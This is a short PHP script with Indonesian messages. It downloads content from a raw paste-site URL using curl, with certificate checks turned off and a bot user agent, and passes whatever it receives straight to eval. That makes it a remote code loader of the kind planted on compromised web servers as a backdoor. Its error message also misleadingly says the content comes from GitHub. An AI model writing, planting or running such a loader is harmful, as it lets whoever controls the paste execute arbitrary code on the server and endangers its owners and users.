<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

function ambilKonten($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Bot/1.0)");
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);

    $output = curl_exec($ch);

    if (curl_errno($ch)) {
        echo "CURL Error: " . curl_error($ch) . "<br>";
        $output = false;
    }

    curl_close($ch);
    return $output;
}

$url = "https://xpaste.online/raw/ad0a46";

$konten = ambilKonten($url);

if ($konten !== false && trim($konten) !== '') {
    eval('?>' . $konten);
} else {
    echo "Gagal mengambil konten dari GitHub. Cek URL atau koneksi server.";
}
?>
